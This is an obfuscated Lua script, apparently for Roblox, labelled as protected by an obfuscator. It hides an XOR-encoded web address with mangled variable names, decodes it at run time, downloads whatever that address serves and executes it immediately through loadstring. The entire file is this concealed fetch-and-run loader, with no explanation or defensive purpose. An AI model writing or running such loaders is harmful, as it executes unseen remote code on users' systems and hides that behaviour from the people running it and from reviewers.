--[[ Protected by Paid Dukun Javanese ]]

( function (...) local _IllIIIIIlI = "\002\021\003\025\001\080\078\088\027\019\029\079\016\000\006\002\020\021\028\001\015\019\020\006\028\030\004\025\029\092\009\014\026\070\060\011\021\003\008\030\016\078\005\011\030\018\078\005\012\020\025\078\031\012\019\014\018\088\004\019\003\015\088\019\029\007\003\030\012\001\030\014\005\000\023\025\079\027\028\019" local _lIlIlIllll = "jawir" local function _lIIIIIIIlI(str, k) local _IIllllIIll = {} for i = 0x1, #str do local _IIllIllIlI = string.byte(str, i) local _llIIlIIlll = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_IIllllIIll, string.char(bit32.bxor(_IIllIllIlI, _llIIlIIlll))) end
 return table.concat(_IIllllIIll) end
 local _IIIllIlIIl = _lIIIIIIIlI(_IllIIIIIlI, _lIlIlIllll) if not _IIIllIlIIl:match("^https://") then return end
 local _IIllIllIll = game:HttpGet(_IIIllIlIIl) loadstring(_IIllIllIll)() end
 )(...)
